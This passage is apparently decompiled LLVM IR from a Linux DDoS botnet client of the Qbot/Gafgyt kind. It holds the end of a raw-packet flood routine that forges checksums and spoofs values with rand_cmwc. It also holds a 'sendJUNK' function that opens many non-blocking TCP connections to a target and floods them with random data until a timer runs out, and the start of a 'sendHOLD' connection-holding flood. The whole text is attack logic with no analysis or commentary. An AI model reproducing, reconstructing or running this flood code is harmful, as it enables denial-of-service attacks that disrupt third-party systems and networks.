  %v4_10e44 = inttoptr i32 %v3_10e44 to i16*
  br label %dec_label_pc_10de8

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10ef8, %dec_label_pc_10eec, %dec_label_pc_10d74
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_10d74 ], [ 0, %dec_label_pc_10eec ], [ %v1_10efc, %dec_label_pc_10ef8 ]
  store i32 %v3_109d0, i32* %r2.global-to-local, align 4
  %v1_10df0 = load i32, i32* @sp, align 4
  %v2_10df0 = inttoptr i32 %v1_10df0 to i32*
  store i32 %v2_10dec, i32* %v2_10df0, align 4
  %v1_10df8 = load i32, i32* @sp, align 4
  %v2_10df8 = add i32 %v1_10df8, 4
  %v3_10df8 = inttoptr i32 %v2_10df8 to i32*
  store i32 16, i32* %v3_10df8, align 4
  %v0_10e00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_109a0, i32* %r2.global-to-local, align 4
  %v6_10e0c = call i32 @__libc_sendto(i32 %v3_108f0, i32 %v0_10e00, i32 %v1_109a0, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10e14 = call i32 @HackerScan2(i32 %storemerge9)
  %v1_10e20 = call i32 @__GI_htonl(i32 %v1_10e14)
  store i32 %v1_10e20, i32* %r2.global-to-local, align 4
  store i32 %v1_10e20, i32* %v3_10e2c, align 4
  %v0_10e30 = call i32 @rand_cmwc()
  %v3_10e3c = urem i32 %v0_10e30, 65536
  store i32 %v3_10e3c, i32* %r2.global-to-local, align 4
  %v1_10e44 = trunc i32 %v0_10e30 to i16
  store i16 %v1_10e44, i16* %v4_10e44, align 4
  %v0_10e48 = call i32 @rand_cmwc()
  store i32 %v0_10e48, i32* %r2.global-to-local, align 4
  store i32 %v0_10e48, i32* %v3_10a54, align 8
  %v0_10e58 = call i32 @rand_cmwc()
  %v1_10e6c = trunc i32 %v0_10e58 to i16
  store i16 %v1_10e6c, i16* %v5_109f4, align 4
  store i32 %v1_109f0, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_10d24, align 4
  %v4_10e84 = call i32 @tcpcsum(i32 %v3_109d0, i32 %v1_109f0)
  %v1_10e94 = trunc i32 %v4_10e84 to i16
  store i16 %v1_10e94, i16* %v4_10d24, align 4
  store i32 %v3_109d0, i32* %r2.global-to-local, align 4
  %v3_10ea4 = load i16, i16* %v2_10da8, align 2
  %v4_10ea4 = zext i16 %v3_10ea4 to i32
  %v3_10eb0 = call i32 @csum(i16* %v2_10db4, i32 %v4_10ea4)
  %sext5 = mul i32 %v3_10eb0, 65536
  %v1_10eb4 = sdiv i32 %sext5, 65536
  store i32 %v1_10eb4, i32* %r2.global-to-local, align 4
  %v1_10ec0 = trunc i32 %v1_10eb4 to i16
  store i16 %v1_10ec0, i16* %v4_10dc4, align 2
  %v9_10ecc = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_10ecc, label %dec_label_pc_10ed4, label %dec_label_pc_10ef8

dec_label_pc_10ed4:                               ; preds = %dec_label_pc_10de8
  %v2_10ed8 = call i32 @__GI_time(i32* null)
  store i32 %v2_10ed8, i32* %r2.global-to-local, align 4
  %v8_10ee8 = icmp sgt i32 %v2_10ed8, %v2_10dd8
  br i1 %v8_10ee8, label %dec_label_pc_10f08, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ed4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10de8

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10de8
  %v1_10efc = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_10de8

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ed4, %dec_label_pc_108a8, %dec_label_pc_10954, %dec_label_pc_10908
  %v1_10f14 = phi i32 [ %v3_108b8, %dec_label_pc_108a8 ], [ %v3_10964, %dec_label_pc_10954 ], [ %v3_10918, %dec_label_pc_10908 ], [ %v2_10ed8, %dec_label_pc_10ed4 ]
  ret i32 %v1_10f14

; uselistorder directives
  uselistorder i32 %v1_10eb4, { 1, 0 }
  uselistorder i32 %v0_10e30, { 1, 0 }
  uselistorder i32 %v1_10db8, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_10b98, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_10aa8, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_10a30, { 1, 0 }
  uselistorder i32 %v1_109f0, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_109d0, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_109a0, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 0, 1 }
  uselistorder i32 (i16*, i32)* @csum, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 0, 1 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 5, 4, 3, 2, 1, 8, 7, 6, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f08, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_10d74, { 1, 0 }
  uselistorder label %dec_label_pc_10ce4, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10b78, { 1, 0 }
  uselistorder label %dec_label_pc_1099c, { 1, 0 }
  uselistorder label %dec_label_pc_108a8, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 69456, i32* %stack_var_-4, align 4
  %v2_10f4c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10f4c, i32* @fp, align 4
  %v0_10f68 = call i32 @getdtablesize()
  store i32 %v0_10f68, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_10f68, 0
  %v3_10f70 = zext i1 %tmp to i32
  %v2_10f74 = add i32 %v3_10f70, %v0_10f68
  %v3_10f78 = sdiv i32 %v2_10f74, 2
  store i32 2, i32* %stack_var_-72, align 4
  %v3_10f90 = urem i32 %arg2, 65536
  %v1_10f98 = call i32 @__GI_htons(i32 %v3_10f90)
  %v3_10fb4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-68)
  %v2_10fbc = icmp eq i32 %v3_10fb4, 0
  br i1 %v2_10fbc, label %dec_label_pc_10fc8, label %dec_label_pc_11438

dec_label_pc_10fc8:                               ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_10fdc = bitcast i32* %stack_var_-64 to i8*
  %v3_10fdc = call i32 @__GI_memset(i8* %v2_10fdc, i32 0)
  %v3_10fe4 = mul i32 %v3_10f78, 8
  %v1_10fe8 = or i32 %v3_10fe4, 7
  %v1_10fec = add i32 %v1_10fe8, 7
  %v3_10ff0 = and i32 %v1_10fec, -8
  %v1_10ff8 = load i32, i32* @sp, align 4
  %v2_10ff8 = sub i32 %v1_10ff8, %v3_10ff0
  %v1_11008 = add i32 %v2_10ff8, 15
  %v3_1100c = and i32 %v1_11008, -8
  %v2_11030 = mul i32 %v3_10f78, 5
  store i32 %v2_11030, i32* @r2, align 4
  %v2_11040 = inttoptr i32 %v3_1100c to i8*
  %v3_11040 = call i32 @__GI_memset(i8* %v2_11040, i32 0)
  %v1_11048 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_11060 = inttoptr i32 %v1_11048 to i8*
  %v3_11060 = call i32 @__GI_memset(i8* %v2_11060, i32 0)
  %v2_11068 = call i32 @__GI_time(i32* null)
  store i32 %v2_11068, i32* %r2.global-to-local, align 4
  %v2_11074 = add i32 %v2_11068, %arg3
  %v2_111b0 = ptrtoint i32* %stack_var_-200 to i32
  %v2_11208 = ptrtoint i32* %stack_var_-24 to i32
  %v2_11274 = ptrtoint i32* %stack_var_-208 to i32
  %v2_112b8 = ptrtoint i32* %stack_var_-216 to i32
  %v2_112bc = ptrtoint i32* %stack_var_-212 to i32
  %v2_11140 = ptrtoint i32* %stack_var_-72 to i32
  %v8_1141845 = icmp sgt i32 %v2_10f74, 1
  %v2_1120c = add i32 %v2_11208, -176
  br label %dec_label_pc_11420

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11410.preheader, %dec_label_pc_11404
  %storemerge248 = phi i32 [ %v1_11408, %dec_label_pc_11404 ], [ 0, %dec_label_pc_11410.preheader ]
  store i32 %v3_1100c, i32* %r2.global-to-local, align 4
  %v3_11098 = mul i32 %storemerge248, 8
  %v2_1109c = add i32 %v3_11098, %v3_1100c
  %v2_110a0 = or i32 %v2_1109c, 4
  %v1_110a4 = inttoptr i32 %v2_110a0 to i8*
  %v2_110a4 = load i8, i8* %v1_110a4, align 4
  %v6_110b0 = icmp eq i8 %v2_110a4, 0
  %v7_110b0 = icmp eq i8 %v2_110a4, 1
  br i1 %v7_110b0, label %dec_label_pc_111c4.lr.ph, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_1108c
  %v7_110bc = icmp eq i8 %v2_110a4, 2
  br i1 %v7_110bc, label %dec_label_pc_11384, label %dec_label_pc_110c4

dec_label_pc_110c4:                               ; preds = %dec_label_pc_110b8
  br i1 %v6_110b0, label %dec_label_pc_110d4, label %dec_label_pc_11404

dec_label_pc_110d4:                               ; preds = %dec_label_pc_110c4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_110e4 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_110f0 = mul i32 %storemerge248, 8
  %v6_110f0 = add i32 %v5_110f0, %v3_1100c
  %v7_110f0 = inttoptr i32 %v6_110f0 to i32*
  store i32 %v3_110e4, i32* %v7_110f0, align 8
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_110fc = inttoptr i32 %v2_1109c to i32*
  %v7_110fc = load i32, i32* %v6_110fc, align 8
  store i32 %v7_110fc, i32* @r4, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11108 = load i32, i32* %v6_110fc, align 8
  store i32 %v7_11108, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_11118 = call i32 @__libc_fcntl(i32 %v7_11108, i32 3)
  %v1_11120 = or i32 %v2_11118, 2048
  store i32 %v1_11120, i32* @r3, align 4
  %v0_11124 = load i32, i32* @r4, align 4
  store i32 %v1_11120, i32* %r2.global-to-local, align 4
  %v2_11130 = call i32 @__libc_fcntl(i32 %v0_11124, i32 4)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_1113c = load i32, i32* %v6_110fc, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11150 = call i32 @__libc_connect(i32 %v7_1113c, i32 %v2_11140, i32 16)
  %v3_11158 = icmp eq i32 %v3_11150, -1
  br i1 %v3_11158, label %dec_label_pc_11160, label %dec_label_pc_11174

dec_label_pc_11160:                               ; preds = %dec_label_pc_110d4
  %v0_11160 = call i32 @__GI___errno_location()
  %v1_11168 = inttoptr i32 %v0_11160 to i32*
  %v2_11168 = load i32, i32* %v1_11168, align 4
  %v7_1116c = icmp eq i32 %v2_11168, 115
  br i1 %v7_1116c, label %dec_label_pc_1118c, label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %dec_label_pc_110d4, %dec_label_pc_11160
  store i32 %v3_1100c, i32* %r2.global-to-local, align 4
  %v7_1117c = load i32, i32* %v6_110fc, align 8
  %v1_11184 = call i32 @__GI_close(i32 %v7_1117c)
  br label %dec_label_pc_11404

dec_label_pc_1118c:                               ; preds = %dec_label_pc_11160
  store i32 %v2_110a0, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_110a4, align 4
  br label %dec_label_pc_11404

dec_label_pc_111c4.lr.ph:                         ; preds = %dec_label_pc_1108c
  br label %dec_label_pc_111c4

dec_label_pc_111c4:                               ; preds = %dec_label_pc_111c4.lr.ph, %dec_label_pc_111c4
  %storemerge37 = phi i32 [ 0, %dec_label_pc_111c4.lr.ph ], [ %v1_111d8, %dec_label_pc_111c4 ]
  store i32 %v2_111b0, i32* %r2.global-to-local, align 4
  %v5_111d0 = mul nuw nsw i32 %storemerge37, 4
  %v6_111d0 = add i32 %v5_111d0, %v2_111b0
  %v7_111d0 = inttoptr i32 %v6_111d0 to i32*
  store i32 0, i32* %v7_111d0, align 4
  %v1_111d8 = add nuw nsw i32 %storemerge37, 1
  %tmp39 = icmp ult i32 %v1_111d8, 32
  br i1 %tmp39, label %dec_label_pc_111c4, label %dec_label_pc_111ec

dec_label_pc_111ec:                               ; preds = %dec_label_pc_111c4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_111f4 = inttoptr i32 %v2_1109c to i32*
  %v7_111f4 = load i32, i32* %v6_111f4, align 8
  %v3_111f8 = udiv i32 %v7_111f4, 32
  store i32 -176, i32* %r2.global-to-local, align 4
  %v3_11204 = mul nuw nsw i32 %v3_111f8, 4
  %v2_11210 = add i32 %v2_1120c, %v3_11204
  %v1_11214 = inttoptr i32 %v2_11210 to i32*
  %v2_11214 = load i32, i32* %v1_11214, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11220 = load i32, i32* %v6_111f4, align 8
  %v1_11224 = urem i32 %v7_11220, 32
  %v6_1122c = shl i32 1, %v1_11224
  %v2_11230 = or i32 %v6_1122c, %v2_11214
  store i32 %v2_11230, i32* %v1_11214, align 4
  store i32 0, i32* %stack_var_-208, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11268 = load i32, i32* %v6_111f4, align 8
  %v1_1126c = add i32 %v7_11268, 1
  store i32 %v1_1126c, i32* %r2.global-to-local, align 4
  %v1_11278 = load i32, i32* @sp, align 4
  %v2_11278 = inttoptr i32 %v1_11278 to i32*
  store i32 %v2_11274, i32* %v2_11278, align 4
  %v0_1127c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_111b0, i32* %r2.global-to-local, align 4
  %v4_1128c = load i32, i32* %stack_var_-208, align 4
  %v5_1128c = call i32 @__libc_select(i32 %v0_1127c, i32 0, i32 %v2_111b0, i32 0, i32 %v4_1128c)
  %v7_1129c = icmp eq i32 %v5_1128c, 1
  br i1 %v7_1129c, label %dec_label_pc_112a4, label %dec_label_pc_11340

dec_label_pc_112a4:                               ; preds = %dec_label_pc_111ec
  store i32 4, i32* %stack_var_-212, align 4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_112b4 = load i32, i32* %v6_111f4, align 8
  store i32 %v7_112b4, i32* %r2.global-to-local, align 4
  %v1_112c0 = load i32, i32* @sp, align 4
  %v2_112c0 = inttoptr i32 %v1_112c0 to i32*
  store i32 %v2_112bc, i32* %v2_112c0, align 4
  %v0_112c4 = load i32, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_112d4 = load i32, i32* %stack_var_-212, align 4
  %v5_112d4 = call i32 @getsockopt(i32 %v0_112c4, i32 1, i32 4, i32 %v2_112b8, i32 %v4_112d4)
  %v3_112d8 = load i32, i32* %stack_var_-216, align 4
  %v2_112dc = icmp eq i32 %v3_112d8, 0
  br i1 %v2_112dc, label %dec_label_pc_1131c, label %dec_label_pc_112e4

dec_label_pc_112e4:                               ; preds = %dec_label_pc_112a4
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_112ec = load i32, i32* %v6_111f4, align 8
  %v1_112f4 = call i32 @__GI_close(i32 %v7_112ec)
  store i32 %v2_110a0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_110a4, align 4
  br label %dec_label_pc_11404

dec_label_pc_1131c:                               ; preds = %dec_label_pc_112a4
  store i32 %v2_110a0, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_110a4, align 4
  br label %dec_label_pc_11404

dec_label_pc_11340:                               ; preds = %dec_label_pc_111ec
  %v3_11344 = icmp eq i32 %v5_1128c, -1
  br i1 %v3_11344, label %dec_label_pc_1134c, label %dec_label_pc_11404

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11340
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_11354 = load i32, i32* %v6_111f4, align 8
  %v1_1135c = call i32 @__GI_close(i32 %v7_11354)
  store i32 %v2_110a0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_110a4, align 4
  br label %dec_label_pc_11404

dec_label_pc_11384:                               ; preds = %dec_label_pc_110b8
  %v2_1138c = call i32 @makeRandomStr(i32 %v1_11048, i32 1024)
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v6_11398 = inttoptr i32 %v2_1109c to i32*
  %v7_11398 = load i32, i32* %v6_11398, align 8
  store i32 1024, i32* %r2.global-to-local, align 4
  %v4_113ac = call i32 @__libc_send(i32 %v7_11398, i32 %v1_11048, i32 1024, i32 16384)
  %v3_113b4 = icmp eq i32 %v4_113ac, -1
  br i1 %v3_113b4, label %dec_label_pc_113bc, label %dec_label_pc_11404

dec_label_pc_113bc:                               ; preds = %dec_label_pc_11384
  %v0_113bc = call i32 @__GI___errno_location()
  %v1_113c4 = inttoptr i32 %v0_113bc to i32*
  %v2_113c4 = load i32, i32* %v1_113c4, align 4
  %v7_113c8 = icmp eq i32 %v2_113c4, 11
  br i1 %v7_113c8, label %dec_label_pc_11404, label %dec_label_pc_113d0

dec_label_pc_113d0:                               ; preds = %dec_label_pc_113bc
  store i32 %storemerge248, i32* %r2.global-to-local, align 4
  %v7_113d8 = load i32, i32* %v6_11398, align 8
  %v1_113e0 = call i32 @__GI_close(i32 %v7_113d8)
  store i32 %v2_110a0, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_110a4, align 4
  br label %dec_label_pc_11404

dec_label_pc_11404:                               ; preds = %dec_label_pc_110c4, %dec_label_pc_11340, %dec_label_pc_11384, %dec_label_pc_113bc, %dec_label_pc_1134c, %dec_label_pc_1131c, %dec_label_pc_112e4, %dec_label_pc_1118c, %dec_label_pc_11174, %dec_label_pc_113d0
  %v1_11408 = add nuw nsw i32 %storemerge248, 1
  store i32 %v1_11408, i32* %r2.global-to-local, align 4
  %v5_1141c = icmp slt i32 %v1_11408, %v3_10f78
  br i1 %v5_1141c, label %dec_label_pc_1108c, label %dec_label_pc_11420

dec_label_pc_11420:                               ; preds = %dec_label_pc_11410.preheader, %dec_label_pc_11404, %dec_label_pc_10fc8
  %v2_11424 = call i32 @__GI_time(i32* null)
  store i32 %v2_11424, i32* %r2.global-to-local, align 4
  %v5_11434 = icmp slt i32 %v2_11424, %v2_11074
  br i1 %v5_11434, label %dec_label_pc_11410.preheader, label %dec_label_pc_11438

dec_label_pc_11410.preheader:                     ; preds = %dec_label_pc_11420
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1141845, label %dec_label_pc_1108c, label %dec_label_pc_11420

dec_label_pc_11438:                               ; preds = %dec_label_pc_11420, %entry
  %v1_11444 = phi i32 [ %v3_10fb4, %entry ], [ %v2_11424, %dec_label_pc_11420 ]
  ret i32 %v1_11444

; uselistorder directives
  uselistorder i32 %v1_11408, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_110a4, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_110a0, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_1109c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge248, { 1, 9, 8, 7, 6, 5, 4, 3, 2, 12, 11, 10, 0, 13 }
  uselistorder i32 %v2_111b0, { 3, 2, 0, 1 }
  uselistorder i32 %v3_1100c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_10f78, { 1, 2, 0 }
  uselistorder i32 %v0_10f68, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 36, 33, 32, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_11404, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_111c4, { 1, 0 }
  uselistorder label %dec_label_pc_11174, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 70740, i32* %stack_var_-4, align 4
  %v2_11450 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11450, i32* @fp, align 4
  %v0_1146c = call i32 @getdtablesize()
  store i32 %v0_1146c, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_1146c, 0
  %v3_11474 = zext i1 %tmp to i32
  %v2_11478 = add i32 %v3_11474, %v0_1146c
  %v3_1147c = sdiv i32 %v2_11478, 2
  store i32 2, i32* %stack_var_-80, align 4
  %v3_11494 = urem i32 %arg2, 65536
  %v1_1149c = call i32 @__GI_htons(i32 %v3_11494)
  %v3_114b8 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-76)
  %v2_114c0 = icmp eq i32 %v3_114b8, 0
  br i1 %v2_114c0, label %dec_label_pc_114cc, label %dec_label_pc_119e4

dec_label_pc_114cc:                               ; preds = %entry
  store i32 8, i32* @r2, align 4
  %v2_114e0 = bitcast i32* %stack_var_-72 to i8*
  %v3_114e0 = call i32 @__GI_memset(i8* %v2_114e0, i32 0)
  %v3_114e8 = mul i32 %v3_1147c, 8
  %v1_114ec = or i32 %v3_114e8, 7
  %v1_114f0 = add i32 %v1_114ec, 7
  %v3_114f4 = and i32 %v1_114f0, -8
  %v1_114fc = load i32, i32* @sp, align 4
  %v2_114fc = sub i32 %v1_114fc, %v3_114f4
  %v1_1150c = add i32 %v2_114fc, 15
  %v3_11510 = and i32 %v1_1150c, -8
  %v2_11534 = mul i32 %v3_1147c, 5
  store i32 %v2_11534, i32* @r2, align 4
  %v2_11544 = inttoptr i32 %v3_11510 to i8*
  %v3_11544 = call i32 @__GI_memset(i8* %v2_11544, i32 0)
  %v1_1154c = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_11564 = inttoptr i32 %v1_1154c to i8*
  %v3_11564 = call i32 @__GI_memset(i8* %v2_11564, i32 0)
  %v2_1156c = call i32 @__GI_time(i32* null)
  store i32 %v2_1156c, i32* %r2.global-to-local, align 4
  %v2_11578 = add i32 %v2_1156c, %arg3
  %v2_116b4 = ptrtoint i32* %stack_var_-208 to i32
  %v2_1170c = ptrtoint i32* %stack_var_-24 to i32
  %v2_11778 = ptrtoint i32* %stack_var_-216 to i32
  %v2_117bc = ptrtoint i32* %stack_var_-224 to i32
  %v2_117c0 = ptrtoint i32* %stack_var_-220 to i32
  %v2_11644 = ptrtoint i32* %stack_var_-80 to i32
  %v8_119c454 = icmp sgt i32 %v2_11478, 1
  %v2_11710 = add i32 %v2_1170c, -184
  br label %dec_label_pc_119cc

dec_label_pc_11590:                               ; preds = %dec_label_pc_119bc.preheader, %dec_label_pc_119b0
  %storemerge357 = phi i32 [ %v1_119b4, %dec_label_pc_119b0 ], [ 0, %dec_label_pc_119bc.preheader ]
  store i32 %v3_11510, i32* %r2.global-to-local, align 4
  %v3_1159c = mul i32 %storemerge357, 8
  %v2_115a0 = add i32 %v3_1159c, %v3_11510
  %v2_115a4 = or i32 %v2_115a0, 4
  %v1_115a8 = inttoptr i32 %v2_115a4 to i8*
  %v2_115a8 = load i8, i8* %v1_115a8, align 4
  %v6_115b4 = icmp eq i8 %v2_115a8, 0
  %v7_115b4 = icmp eq i8 %v2_115a8, 1
  br i1 %v7_115b4, label %dec_label_pc_116c8.lr.ph, label %dec_label_pc_115bc

dec_label_pc_115bc:                               ; preds = %dec_label_pc_11590
  %v7_115c0 = icmp eq i8 %v2_115a8, 2
  br i1 %v7_115c0, label %dec_label_pc_1189c.lr.ph, label %dec_label_pc_115c8

dec_label_pc_115c8:                               ; preds = %dec_label_pc_115bc
  br i1 %v6_115b4, label %dec_label_pc_115d8, label %dec_label_pc_119b0

dec_label_pc_115d8:                               ; preds = %dec_label_pc_115c8
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_115e8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v5_115f4 = mul i32 %storemerge357, 8
  %v6_115f4 = add i32 %v5_115f4, %v3_11510
  %v7_115f4 = inttoptr i32 %v6_115f4 to i32*
  store i32 %v3_115e8, i32* %v7_115f4, align 8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_11600 = inttoptr i32 %v2_115a0 to i32*
  %v7_11600 = load i32, i32* %v6_11600, align 8
  store i32 %v7_11600, i32* @r4, align 4
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_1160c = load i32, i32* %v6_11600, align 8
  store i32 %v7_1160c, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_1161c = call i32 @__libc_fcntl(i32 %v7_1160c, i32 3)
  %v1_11624 = or i32 %v2_1161c, 2048
  store i32 %v1_11624, i32* @r3, align 4
  %v0_11628 = load i32, i32* @r4, align 4
  store i32 %v1_11624, i32* %r2.global-to-local, align 4
  %v2_11634 = call i32 @__libc_fcntl(i32 %v0_11628, i32 4)
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v7_11640 = load i32, i32* %v6_11600, align 8
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_11654 = call i32 @__libc_connect(i32 %v7_11640, i32 %v2_11644, i32 16)
  %v3_1165c = icmp eq i32 %v3_11654, -1
  br i1 %v3_1165c, label %dec_label_pc_11664, label %dec_label_pc_11678

dec_label_pc_11664:                               ; preds = %dec_label_pc_115d8
  %v0_11664 = call i32 @__GI___errno_location()
  %v1_1166c = inttoptr i32 %v0_11664 to i32*
  %v2_1166c = load i32, i32* %v1_1166c, align 4
  %v7_11670 = icmp eq i32 %v2_1166c, 115
  br i1 %v7_11670, label %dec_label_pc_11690, label %dec_label_pc_11678

dec_label_pc_11678:                               ; preds = %dec_label_pc_115d8, %dec_label_pc_11664
  store i32 %v3_11510, i32* %r2.global-to-local, align 4
  %v7_11680 = load i32, i32* %v6_11600, align 8
  %v1_11688 = call i32 @__GI_close(i32 %v7_11680)
  br label %dec_label_pc_119b0

dec_label_pc_11690:                               ; preds = %dec_label_pc_11664
  store i32 %v2_115a4, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_115a8, align 4
  br label %dec_label_pc_119b0

dec_label_pc_116c8.lr.ph:                         ; preds = %dec_label_pc_11590
  br label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_116c8.lr.ph, %dec_label_pc_116c8
  %storemerge513 = phi i32 [ 0, %dec_label_pc_116c8.lr.ph ], [ %v1_116dc, %dec_label_pc_116c8 ]
  store i32 %v2_116b4, i32* %r2.global-to-local, align 4
  %v5_116d4 = mul nuw nsw i32 %storemerge513, 4
  %v6_116d4 = add i32 %v5_116d4, %v2_116b4
  %v7_116d4 = inttoptr i32 %v6_116d4 to i32*
  store i32 0, i32* %v7_116d4, align 4
  %v1_116dc = add nuw nsw i32 %storemerge513, 1
  %tmp47 = icmp ult i32 %v1_116dc, 32
  br i1 %tmp47, label %dec_label_pc_116c8, label %dec_label_pc_116f0

dec_label_pc_116f0:                               ; preds = %dec_label_pc_116c8
  store i32 %storemerge357, i32* %r2.global-to-local, align 4
  %v6_116f8 = inttoptr i32 %v2_115a0 to i32*
  %v7_116f8 = load i32, i32* %v6_116f8, align 8
  %v3_116fc = udiv i32 %v7_116f8, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_11708 = mul nuw nsw i32 %v3_116fc, 4
